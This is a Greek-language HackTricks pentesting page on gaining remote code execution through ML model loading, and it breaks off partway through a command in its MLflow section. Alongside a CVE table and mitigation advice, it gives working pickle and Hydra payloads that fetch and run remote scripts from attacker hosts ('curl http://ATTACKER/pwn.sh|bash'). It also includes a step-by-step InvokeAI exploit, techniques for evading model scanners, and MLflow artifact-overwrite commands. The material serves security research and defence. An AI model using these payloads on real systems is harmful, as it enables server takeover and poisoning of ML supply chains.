# RCE σε μοντέλα

{{#include ../banners/hacktricks-training.md}}

## Φόρτωση μοντέλων για RCE

Τα μοντέλα Machine Learning συνήθως διαμοιράζονται σε διάφορες μορφές, όπως ONNX, TensorFlow, PyTorch κ.λπ. Οι προγραμματιστές μπορούν να τα φορτώσουν στους υπολογιστές τους ή σε συστήματα παραγωγής και να τα χρησιμοποιήσουν. Συνήθως τα μοντέλα δεν θα πρέπει να περιέχουν κακόβουλο κώδικα, αλλά σε ορισμένες περιπτώσεις το μοντέλο μπορεί να χρησιμοποιηθεί για την εκτέλεση αυθαίρετου κώδικα στο σύστημα, είτε ως προβλεπόμενη λειτουργία είτε λόγω ευπάθειας στη βιβλιοθήκη φόρτωσης μοντέλων.

Ο παρακάτω πίνακας παραθέτει χαρακτηριστικές ευπάθειες αυτής της κατηγορίας:

| **Framework / Tool**        | **Ευπάθεια (CVE, αν είναι διαθέσιμο)**                                                    | **Διάνυσμα RCE**                                                                                                                           | **Αναφορές**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Μη ασφαλής αποσειριοποίηση στο* `torch.load` **(CVE-2025-32434)**                                                              | Κακόβουλο pickle σε checkpoint μοντέλου οδηγεί σε εκτέλεση κώδικα (παρακάμπτοντας την προστασία `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + λήψη κακόβουλου μοντέλου προκαλεί εκτέλεση κώδικα· RCE μέσω αποσειριοποίησης Java στο management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Μη ασφαλής αποσειριοποίηση checkpoint μέσω `torch.load` **(CVE-2025-23298)**                                           | Μη έμπιστο checkpoint ενεργοποιεί τον pickle reducer κατά το `load_model_trainer_states_from_checkpoint` → εκτέλεση κώδικα στο ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + μη ασφαλές hook επέκτασης MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Το ελεγχόμενο από τον χρήστη κλειδί `filter` εισάγει σύνταξη SQL/JSON-path, το `UNION SELECT` δημιουργεί μια πλαστή εγγραφή checkpoint και, στη συνέχεια, η αποσειριοποίηση `msgpack` εισάγει και καλεί κώδικα Python που επιλέγει ο επιτιθέμενος | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (μη ασφαλές YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Η φόρτωση μοντέλου από YAML χρησιμοποιεί `yaml.unsafe_load` (εκτέλεση κώδικα) <br> Η φόρτωση μοντέλου με layer **Lambda** εκτελεί αυθαίρετο κώδικα Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (ανάλυση TFLite)                                                                                          | Ένα ειδικά διαμορφωμένο μοντέλο `.tflite` προκαλεί υπερχείλιση ακεραίου → αλλοίωση heap (πιθανό RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Η φόρτωση μοντέλου μέσω `joblib.load` εκτελεί pickle με payload `__reduce__` του επιτιθέμενου                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (μη ασφαλές `np.load`) *υπό αμφισβήτηση*                                                                              | Η προεπιλεγμένη συμπεριφορά του `numpy.load` επέτρεπε πίνακες αντικειμένων σε pickle – κακόβουλο `.npy/.npz` προκαλεί εκτέλεση κώδικα                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Η διαδρομή των εξωτερικών weights του μοντέλου ONNX μπορεί να διαφύγει από τον κατάλογο (ανάγνωση αυθαίρετων αρχείων) <br> Κακόβουλο tar μοντέλου ONNX μπορεί να αντικαταστήσει αυθαίρετα αρχεία (οδηγώντας σε RCE) | |
| ONNX Runtime (κίνδυνος σχεδιασμού)  | *(Χωρίς CVE)* custom ops / control flow του ONNX                                                                                    | Μοντέλο με custom operator απαιτεί τη φόρτωση εγγενούς κώδικα του επιτιθέμενου· σύνθετα γραφήματα μοντέλων καταχρώνται τη λογική για να εκτελούν ανεπιθύμητους υπολογισμούς   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Η χρήση του API φόρτωσης μοντέλων με ενεργοποιημένο το `--model-control` επιτρέπει σχετικό path traversal για εγγραφή αρχείων (π.χ. αντικατάσταση του `.bashrc` για RCE)    | |
| **GGML (μορφή GGUF)**      | **CVE-2024-25664 … 25668** (πολλαπλές υπερχειλίσεις heap)                                                                         | Κακοσχηματισμένο αρχείο μοντέλου GGUF προκαλεί υπερχειλίσεις heap buffer στον parser, επιτρέποντας την εκτέλεση αυθαίρετου κώδικα στο σύστημα του θύματος                     | |
| **Keras (παλαιότερες μορφές)**   | *(Χωρίς νέο CVE)* Μοντέλο Keras H5 παλαιού τύπου                                                                                         | Κακόβουλο μοντέλο HDF5 (`.h5`) με layer Lambda εξακολουθεί να εκτελεί κώδικα κατά τη φόρτωση (το Keras safe_mode δεν καλύπτει την παλιά μορφή – «downgrade attack») | |
| **Άλλα** (γενικά)        | *Ελάττωμα σχεδιασμού* – σειριοποίηση Pickle                                                                                         | Πολλά ML tools (π.χ. μορφές μοντέλων που βασίζονται σε pickle, Python `pickle.load`) εκτελούν αυθαίρετο κώδικα ενσωματωμένο σε αρχεία μοντέλων, εκτός αν ληφθούν μέτρα μετριασμού | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Μη έμπιστα metadata που διαβιβάζονται στο `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadata/config του μοντέλου, ελεγχόμενα από τον επιτιθέμενο, ορίζουν το `_target_` σε αυθαίρετη callable (π.χ. `builtins.exec`) → εκτελείται κατά τη φόρτωση, ακόμη και με «ασφαλείς» μορφές (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Επιπλέον, υπάρχουν μοντέλα που βασίζονται σε Python pickle, όπως αυτά που χρησιμοποιούνται από το [PyTorch](https://github.com/pytorch/pytorch/security), τα οποία μπορούν να χρησιμοποιηθούν για την εκτέλεση αυθαίρετου κώδικα στο σύστημα, αν δεν φορτωθούν με `weights_only=True`. Επομένως, κάθε μοντέλο που βασίζεται σε pickle μπορεί να είναι ιδιαίτερα ευάλωτο σε αυτόν τον τύπο επιθέσεων, ακόμη κι αν δεν αναφέρεται στον παραπάνω πίνακα.

### Παράκαμψη στατικών ελέγχων σε checkpoints που βασίζονται σε pickle

Μια διαδρομή φόρτωσης μοντέλου που καλεί `pickle.load()`, `joblib.load()` χωρίς περιορισμούς ή `torch.load(..., weights_only=False)` αποτελεί σημείο εκτέλεσης, όχι απλώς parser.<sup>[[22]](#references)</sup> Στο PyTorch 2.6, η προεπιλογή του `torch.load()` είναι `weights_only=True` όταν δεν παρέχεται προσαρμοσμένο pickle module· τα παρακάτω παραδείγματα απαιτούν loader χωρίς περιορισμούς ή εφαρμογή που απενεργοποιεί αυτή την προστασία, ώστε να φορτωθεί ένα μη υποστηριζόμενο αντικείμενο.<sup>[[4]](#references)</sup> Ένα καθαρό αποτέλεσμα στατικού ελέγχου δεν αλλάζει αυτό το όριο.<sup>[[21]](#references)</sup>

Δείτε την [αποσειριοποίηση Python pickle](../pentesting-web/deserialization/#pickle) για τη βασική primitive `__reduce__` και τη [λίστα επιτρεπόμενων imports του Fickling για ML](keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) για ελέγχους imports κατά τον χρόνο εκτέλεσης.

#### Καταχώριση callable και έπειτα επίλυσή της με `EXT2`

Ένα pickle μπορεί να καλέσει το `copyreg.add_extension` μέσω του `REDUCE`, καταχωρίζοντας ένα ζεύγος module/name με αριθμητικό κωδικό επέκτασης που επιλέγει ο επιτιθέμενος. Έπειτα, ένα `EXT2` επιλύει αυτόν τον κωδικό σε callable, την οποία μπορεί να καλέσει ένα ακόμη `REDUCE`. Επομένως, η κρίσιμη callable δεν είναι το operand ενός opcode `GLOBAL` ή `STACK_GLOBAL`. Η Binarly το παρουσίασε χρησιμοποιώντας το `multiprocessing.util.spawnv_passfds`· τέσσερις από τους πέντε scanners που αξιολογήθηκαν δεν το εντόπισαν, ενώ το SaferPickle το ανίχνευσε. Η τροποποίηση του registry και η επίλυση μέσω `EXT2` γίνονται μέσα στην ίδια διαδικασία unpickling.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Αυτό είναι ένα περίγραμμα opcode, όχι ένα πλήρες checkpoint: ο εξωτερικός loader πρέπει να αποδέχεται το περιβάλλον pickle stream. Ένας σαρωτής που αναζητά μόνο επικίνδυνες callable τιμές στα ορίσματα του `GLOBAL` δεν εντοπίζει την επόμενη αναζήτηση· ένας σαρωτής χωρίς υποστήριξη `EXT2` μπορεί να αποτύχει πριν εκδώσει ετυμηγορία. Μια αυστηρή allowlist θα μπορούσε και πάλι να απορρίψει το ίδιο το `copyreg.add_extension`.<sup>[[21]](#references)</sup>

#### Απόκρυψη κατασκευασμένων τύπων code object πίσω από συνηθισμένες συναρτήσεις

Μια άλλη αλυσίδα pickle μπορεί να αποκτήσει το `FunctionType` από το `type(copy.copy)` και το `CodeType` από το `type(copy.copy.__code__)`, έπειτα να κατασκευάσει ένα code object από παρεχόμενο bytecode, να το τυλίξει ως συνάρτηση και να το καλέσει. Η δημοσιευμένη παραλλαγή αποκτά το `__code__` μέσω του `operator.methodcaller('__getattribute__', '__code__')`, επομένως το pickle δεν χρειάζεται να εισαγάγει κανέναν από τους δύο constructors με το όνομά του. Η διάταξη πεδίων του `CodeType(...)` και το bytecode εξαρτώνται από την έκδοση του CPython· ένα payload που έχει φτιαχτεί για διαφορετικό interpreter μπορεί να αποτύχει πριν από την εκτέλεση. Το SaferPickle επισήμανε και πάλι το δείγμα επίδειξης, αλλά το υποβάθμισε σε `suspicious`· οι άλλοι τέσσερις σαρωτές που αξιολογήθηκαν δεν το εντόπισαν.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Ενεργοποίηση φόρτωσης δεύτερου model μέσω ορίσματος pickle

Ένα εξωτερικό pickle μπορεί να καλέσει το `torch.storage._load_from_bytes` με όρισμα ένα serialized model που έχει δοθεί από τον attacker. Αυτή η συνάρτηση καλεί το `torch.load(io.BytesIO(b), weights_only=False)`, επομένως το nested model γίνεται deserialize χωρίς τον περιορισμό weights-only, παρότι σε έναν top-level opcode scanner φαίνεται σαν bytes που περνούν σε μία callable. Η εξωτερική φόρτωση πρέπει και πάλι να επιτρέπει αυτή την callable· το `weights_only=True` δεν κάνει αυτόματα το εξωτερικό pickle να την αποδεχτεί. Οι scanners που δεν εξετάζουν αναδρομικά τα nested bytes μπορεί να μην εντοπίσουν την εσωτερική αλυσίδα `GLOBAL`/`REDUCE`.<sup>[[21]](#references)[[23]](#references)</sup>

#### Επίλυση ονόματος legacy pickle module κατά τη φόρτωση

Για pickle protocols παλαιότερα από το 3, η προεπιλεγμένη ρύθμιση `fix_imports=True` της Python αντιστοιχίζει μια αναφορά `GLOBAL` στο `commands.run` στο `subprocess.run` μέσω του `_compat_pickle.IMPORT_MAPPING`. Έτσι, ένας scanner που συγκρίνει το κυριολεκτικό όνομα του module με denylist του `subprocess` μπορεί να μην εντοπίσει την callable που θα εκτελεστεί. Αυτό απαιτεί loader που διατηρεί το compatibility mapping και αποδέχεται τα ορίσματα της callable που προκύπτει.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Παράκαμψη scanner που δέχεται μόνο ZIP με non-ZIP checkpoint

Η επιλογή format μπορεί να αποτύχει ανεξάρτητα από την επιθεώρηση των opcodes: Η Binarly διαπίστωσε ότι το ModelScan 0.8.8 δρομολογούσε αρχεία `.bin`, `.pt`, `.pth` και `.ckpt` σε scanner PyTorch ειδικό για ZIP και παρέλειπε ένα non-ZIP pickle stream, αντί να καταφύγει στον scanner για plain pickle. Κατέγραψε επίσης ένα legacy TAR model layout που γίνεται αποδεκτό από το `torch.load()`, αλλά δεν επιθεωρείται από τα ModelScan και JFrog. Πρόκειται για κενά που εξαρτώνται από την έκδοση του scanner, όχι για ιδιότητες κάθε model scanner.<sup>[[21]](#references)</sup>

#### Εκτέλεση πριν φτάσει ένας static parser σε malformed tail

Ένας scanner που διατρέχει πλήρως ένα pickle με `pickletools.genops()` μπορεί να προκαλέσει exception σε truncated opcode μετά από ένα έγκυρο `REDUCE`. Ο unrestricted unpickler έχει ήδη καλέσει την callable πριν συναντήσει αυτό το tail, ακόμη κι αν στη συνέχεια αποτύχει συνολικά η φόρτωση. Στο αναφερόμενο δείγμα, ένα truncated `BINUNICODE` τοποθετήθηκε αμέσως μετά το `REDUCE` που εκτελούσε τον κώδικα, με αποτέλεσμα να αποτύχει το `pickletools.genops()` ενώ είχε ήδη πραγματοποιηθεί η προηγούμενη παρενέργεια εγγραφής αρχείου. Αυτό παρακάμπτει έναν scanner μόνο αν εκείνος θεωρήσει το parse error ακίνδυνο ή παραλείψει το αρχείο. Είναι χρήσιμο μόνο όταν η παρενέργεια έχει σημασία χωρίς να επιστραφεί επιτυχώς ένα model· ένας στόχος που απαιτεί να ολοκληρωθεί η φόρτωση μπορεί να απορρίψει το artifact.<sup>[[21]](#references)</sup>

### Hydra metadata → RCE (λειτουργεί ακόμη και με safetensors)

Η `hydra.utils.instantiate()` εισάγει και καλεί οποιοδήποτε dotted `_target_` σε ένα αντικείμενο configuration/metadata. Όταν libraries όπως το Hugging Face Transformers περνούν **untrusted model metadata** στην `instantiate()`, ένας attacker μπορεί να παρέχει μια callable και ορίσματα που εκτελούνται αμέσως κατά τη φόρτωση του model (δεν απαιτείται pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Παράδειγμα payload (λειτουργεί στο `model_config.yaml` του `.nemo`, στο `config.json` του repo ή μέσα στο `__metadata__` του `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Βασικά σημεία:
- Ενεργοποιείται πριν από την αρχικοποίηση του μοντέλου στα `restore_from/from_pretrained` του NeMo, στους HuggingFace coders του uni2TS και στους loaders του FlexTok.
- Η string block-list του Hydra μπορεί να παρακαμφθεί μέσω εναλλακτικών διαδρομών εισαγωγής (π.χ. `enum.bltns.eval`) ή ονομάτων που επιλύονται από την εφαρμογή (π.χ. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- Το FlexTok αναλύει επίσης stringified metadata με `ast.literal_eval`, επιτρέποντας DoS (υπερβολική χρήση CPU/memory) πριν από την κλήση του Hydra.

### 🆕  RCE στο InvokeAI μέσω `torch.load` (CVE-2024-12029)

Το `InvokeAI` είναι ένα δημοφιλές open-source web interface για το Stable-Diffusion. Οι εκδόσεις **5.3.1 – 5.4.2** εκθέτουν το REST endpoint `/api/v2/models/install`, το οποίο επιτρέπει στους χρήστες να κατεβάζουν και να φορτώνουν μοντέλα από αυθαίρετα URLs.<sup>[[1]](#references)</sup>

Εσωτερικά, το endpoint τελικά καλεί:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Όταν το παρεχόμενο αρχείο είναι ένα **PyTorch checkpoint (`*.ckpt`)**, το `torch.load` εκτελεί **αποσειριοποίηση pickle**. Επειδή το περιεχόμενο προέρχεται απευθείας από URL που ελέγχει ο χρήστης, ένας attacker μπορεί να ενσωματώσει ένα κακόβουλο object με προσαρμοσμένη μέθοδο `__reduce__` μέσα στο checkpoint· η μέθοδος εκτελείται **κατά την αποσειριοποίηση**, οδηγώντας σε **remote code execution (RCE)** στον server του InvokeAI.

Η ευπάθεια έλαβε την αναγνωριστική ονομασία **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Βήμα προς βήμα εκμετάλλευση

1. Δημιουργήστε ένα κακόβουλο checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Φιλοξενήστε το `payload.ckpt` σε έναν HTTP server που ελέγχετε (π.χ. `http://ATTACKER/payload.ckpt`).
3. Ενεργοποιήστε το ευάλωτο endpoint (δεν απαιτείται authentication):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Όταν το InvokeAI κατεβάζει το αρχείο, καλεί την `torch.load()` → εκτελείται το gadget `os.system` και ο attacker αποκτά εκτέλεση κώδικα στο πλαίσιο της διεργασίας InvokeAI.

Έτοιμο exploit: το module **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` αυτοματοποιεί όλη τη διαδικασία.<sup>[[3]](#references)</sup>

#### Προϋποθέσεις

•  InvokeAI 5.3.1-5.4.2 (η προεπιλεγμένη τιμή της σημαίας scan είναι **false**)
•  Το `/api/v2/models/install` είναι προσβάσιμο από τον attacker
•  Η διεργασία έχει δικαιώματα εκτέλεσης shell commands

#### Μετριασμός κινδύνου

* Αναβαθμίστε σε **InvokeAI ≥ 5.4.3** – το patch ορίζει το `scan=True` ως προεπιλογή και εκτελεί malware scanning πριν από το deserialization.<sup>[[2]](#references)</sup>
* Κατά τη φόρτωση checkpoints μέσω προγραμματισμού, χρησιμοποιήστε `torch.load(file, weights_only=True)` ή το νέο helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Εφαρμόστε allow-lists / signatures για τις πηγές των models και εκτελέστε την υπηρεσία με τα ελάχιστα απαραίτητα δικαιώματα.

> ⚠️ Να θυμάστε ότι οποιαδήποτε μορφή βασίζεται σε Python pickle (συμπεριλαμβανομένων πολλών αρχείων `.pt`, `.pkl`, `.ckpt`, `.pth`) είναι εγγενώς μη ασφαλής για deserialization από μη έμπιστες πηγές.

---

Παράδειγμα ad-hoc μετριασμού κινδύνου, αν πρέπει να συνεχίσετε να εκτελείτε παλαιότερες εκδόσεις του InvokeAI πίσω από reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE μέσω μη ασφαλούς `torch.load` (CVE-2025-23298)

Το NVIDIA Transformers4Rec (μέρος του Merlin) εξέθετε έναν μη ασφαλή loader checkpoint, ο οποίος καλούσε απευθείας τη `torch.load()` σε paths που παρείχε ο χρήστης. Επειδή η `torch.load` βασίζεται στην Python `pickle`, ένα checkpoint που ελέγχεται από επιτιθέμενο μπορεί να εκτελέσει αυθαίρετο κώδικα μέσω ενός reducer κατά την αποσειριοποίηση.<sup>[[5]](#references)</sup>

Ευάλωτο path (πριν από τη διόρθωση): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Γιατί αυτό οδηγεί σε RCE: Στην Python `pickle`, ένα αντικείμενο μπορεί να ορίσει έναν reducer (`__reduce__`/`__setstate__`) που επιστρέφει μια callable και ορίσματα. Η callable εκτελείται κατά το unpickling. Αν υπάρχει τέτοιο αντικείμενο σε ένα checkpoint, εκτελείται πριν χρησιμοποιηθούν οποιαδήποτε weights.

Ελάχιστο παράδειγμα κακόβουλου checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Φορείς παράδοσης και ακτίνα επίδρασης:
- Trojanized checkpoints/models που κοινοποιούνται μέσω repos, buckets ή artifact registries
- Αυτοματοποιημένα pipelines επαναφοράς/ανάπτυξης που φορτώνουν αυτόματα checkpoints
- Η εκτέλεση γίνεται μέσα σε workers εκπαίδευσης/inference, συχνά με αυξημένα προνόμια (π.χ. root σε containers)

Διόρθωση: Το commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) αντικατέστησε την άμεση χρήση του `torch.load()` με έναν περιορισμένο deserializer allow-list, που υλοποιείται στο `transformers4rec/utils/serialization.py`. Ο νέος loader επικυρώνει τύπους/πεδία και αποτρέπει την κλήση αυθαίρετων callables κατά τη φόρτωση.<sup>[[7]](#references)</sup>

Οδηγίες άμυνας ειδικά για PyTorch checkpoints:
- Μην κάνετε unpickle μη έμπιστων δεδομένων. Προτιμήστε μη εκτελέσιμες μορφές, όπως [Safetensors](https://huggingface.co/docs/safetensors/index) ή ONNX, όπου είναι δυνατό.
- Αν πρέπει να χρησιμοποιήσετε serialization του PyTorch, βεβαιωθείτε ότι έχει οριστεί `weights_only=True` (υποστηρίζεται σε νεότερες εκδόσεις του PyTorch) ή χρησιμοποιήστε έναν custom unpickler με allow-list, παρόμοιο με το patch του Transformers4Rec.<sup>[[4]](#references)</sup>
- Επιβάλετε έλεγχο προέλευσης/υπογραφών των μοντέλων και απομονώστε το deserialization σε sandbox (seccomp/AppArmor· χρήστης non-root· περιορισμένο FS και χωρίς εξερχόμενη δικτυακή κίνηση).
- Παρακολουθείτε για μη αναμενόμενες child processes από υπηρεσίες ML κατά τη φόρτωση checkpoint· εντοπίζετε τη χρήση των `torch.load()`/`pickle`.

Αναφορές POC και ευάλωτων εκδόσεων/patch:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Ευάλωτος loader πριν από το patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC κακόβουλου checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader μετά το patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Παράδειγμα – δημιουργία κακόβουλου μοντέλου PyTorch

- Δημιουργήστε το μοντέλο:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Φόρτωσε το μοντέλο:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Αποσειριοποίηση Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Το FaceDetection-DSFD της Tencent εκθέτει ένα endpoint `resnet` που αποσειριοποιεί δεδομένα ελεγχόμενα από τον χρήστη. Η ZDI επιβεβαίωσε ότι ένας απομακρυσμένος εισβολέας μπορεί να εξαναγκάσει ένα θύμα να φορτώσει μια κακόβουλη σελίδα/αρχείο, να το κάνει να στείλει ένα ειδικά διαμορφωμένο σειριοποιημένο blob σε αυτό το endpoint και να πυροδοτήσει την αποσειριοποίηση ως `root`, οδηγώντας σε πλήρη παραβίαση.

Η ροή του exploit είναι αντίστοιχη με τη συνηθισμένη κατάχρηση του pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Οποιοδήποτε gadget είναι προσβάσιμο κατά την αποσειριοποίηση (constructors, `__setstate__`, callbacks framework κ.λπ.) μπορεί να οπλοποιηθεί με τον ίδιο τρόπο, ανεξάρτητα από το αν η μεταφορά έγινε μέσω HTTP, WebSocket ή με αρχείο που τοποθετήθηκε σε έναν κατάλογο υπό παρακολούθηση.



### LangGraph checkpointer SQLi → MessagePack RCE

Αυτή η αλυσίδα επίθεσης είναι ενδιαφέρουσα, επειδή ο επιτιθέμενος **δεν χρειάζεται να ανεβάσει ένα κακόβουλο αρχείο μοντέλου**. Αντίθετα, η εφαρμογή εκθέτει ένα **API persistence για AI-agent** (`get_state_history(..., filter=...)`) και η είσοδος του χρήστη καταλήγει στον query builder του checkpointer.

#### 1. Δομικό SQLi στα metadata filters

Ένα ευάλωτο μοτίβο SQLite έμοιαζε ως εξής:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Η τιμή δεσμεύεται αργότερα, αλλά το `query_key` συνενώνεται στη **συμβολοσειρά διαδρομής JSON**, επομένως ένα `'` μέσα στο κλειδί του λεξικού ξεφεύγει από το `'$.{query_key}'` και εισάγει SQL. Το ίδιο ισχύει για **διαδρομές JSON, αναγνωριστικά, τελεστές, πεδία `LIMIT` και TTL**: τα placeholders προστατεύουν μόνο τις τιμές, όχι τη δομή του query.

#### 2. Το `UNION SELECT` μπορεί να στοχεύσει μεταγενέστερα sinks και όχι μόνο να κλέψει δεδομένα

Το query επιστρέφει τα `type` και σειριοποιημένα bytes `checkpoint`, τα οποία στη συνέχεια καταναλώνονται ως:

```python
self.serde.loads_typed((type, checkpoint))
```

Αυτό σημαίνει ότι ένα SQLi στο `WHERE` clause μπορεί να εισαγάγει μια **ψεύτικη γραμμή αποτελέσματος**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Αν μεταγενέστερος κώδικας κάνει parse, deserializes, γράφει ή εκτελεί οποιαδήποτε επιλεγμένη στήλη, αντιστοιχίστε αυτές τις στήλες με τα sinks τους. Σε αυτήν την περίπτωση, η πλαστή γραμμή μετατρέπει το SQLi σε **attacker-controlled deserialization**.

#### 3. Τα μη ασφαλή MessagePack extension hooks ισοδυναμούν με code gadgets

Η διαδρομή `msgpack` του LangGraph χρησιμοποιούσε ένα custom extension hook που έκανε unpack ένα nested tuple και εκτελούσε:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Έτσι, ένα MessagePack extension object που κωδικοποιεί κάτι ισοδύναμο με το `("os", "system", "id > /tmp/pwned")` εισάγει το `os`, εντοπίζει το `system` και εκτελεί την εντολή. Κατά τον έλεγχο AI frameworks, εξετάστε **custom MessagePack/JSON/pickle revivers** για dynamic imports, reflection ή αυθαίρετο callable dispatch.

#### 4. Πρακτικό μοτίβο ελέγχου για agent frameworks

Ελέγξτε κάθε user-controlled input που φτάνει σε:
- APIs για state history / memory / replay / checkpoint listing
- δομημένους filter builders που δημιουργούν SQL ή Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths που εμπιστεύονται rows τα οποία επιστρέφει το persistence layer

Αυτή η συγκεκριμένη αλυσίδα επηρέαζε self-hosted LangGraph deployments που χρησιμοποιούσαν **SQLite** ή **Redis** checkpointers, όταν untrusted users μπορούσαν να ελέγχουν το `filter`. Οι patched εκδόσεις που αναφέρονταν στη γνωστοποίηση ήταν οι `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` και `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow PyFunc: overwrite artifact που οδηγεί σε pickle RCE

Ένα MLflow PyFunc που δημιουργείται από ένα `PythonModel` μπορεί να αποθηκεύσει το serialized object ως `python_model.pkl`. Τα model metadata ορίζουν το `mlflow.pyfunc.model` ως loader, ενώ η υλοποίηση του MLflow χρησιμοποιεί αυτό το filename για το αποθηκευμένο Python model. Κατά συνέπεια, η δυνατότητα εγγραφής στο artifact store μπορεί να οδηγήσει σε code execution σε διαφορετική εφαρμογή που φορτώνει αργότερα το model.<sup>[[17]](#references)[[18]](#references)</sup>

Η χρήσιμη αλυσίδα είναι **δικαίωμα εγγραφής στο artifact → αντικατάσταση του pickle → πρόκληση επαναφόρτωσής του από έναν inference consumer**. Για ένα experiment που χρησιμοποιεί proxied `mlflow-artifacts:/...` root, κάντε enumerate το experiment, το run και το model artifact path. Ο tracking server εκθέτει `GET` και `PUT` στο `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
